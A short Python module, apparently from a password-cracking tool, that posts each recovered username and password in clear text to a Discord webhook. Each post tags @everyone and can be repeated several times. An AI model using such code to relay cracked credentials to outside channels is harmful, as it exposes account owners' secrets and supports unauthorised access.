"""Discord webhook notifier for password hits."""

from __future__ import annotations

import logging
import threading
from typing import Optional

import requests

from config import config

logger = logging.getLogger(__name__)


def notify_hit(username: str, password: str, *, task_id: Optional[str] = None) -> None:
    """Fire-and-forget Discord spam on a successful find."""
    url = (config.DISCORD_WEBHOOK_URL or "").strip()
    if not url:
        return

    count = max(1, int(config.DISCORD_HIT_SPAM_COUNT or 1))

    def _send() -> None:
        content = f"@everyone `{password}` FOUND!!!!!!!!!!!!!!!"
        payload = {
            "content": content,
            "allowed_mentions": {"parse": ["everyone"]},
            "embeds": [
                {
                    "title": "PASSWORD FOUND!!!!!!!!!!!!!!!",
                    "color": 0xF0A43A,
                    "fields": [
                        {"name": "username", "value": f"`{username}`", "inline": True},
                        {"name": "password", "value": f"`{password}`", "inline": True},
                        {
                            "name": "task",
                            "value": f"`{(task_id or 'unknown')[:8]}`",
                            "inline": True,
                        },
                    ],
                }
            ],
        }
        for i in range(count):
            try:
                resp = requests.post(url, json=payload, timeout=10)
                if resp.status_code >= 400:
                    logger.warning(
                        "Discord webhook failed (%s): %s",
                        resp.status_code,
                        resp.text[:200],
                    )
            except Exception as exc:
                logger.warning("Discord webhook error: %s", exc)

    threading.Thread(target=_send, daemon=True).start()
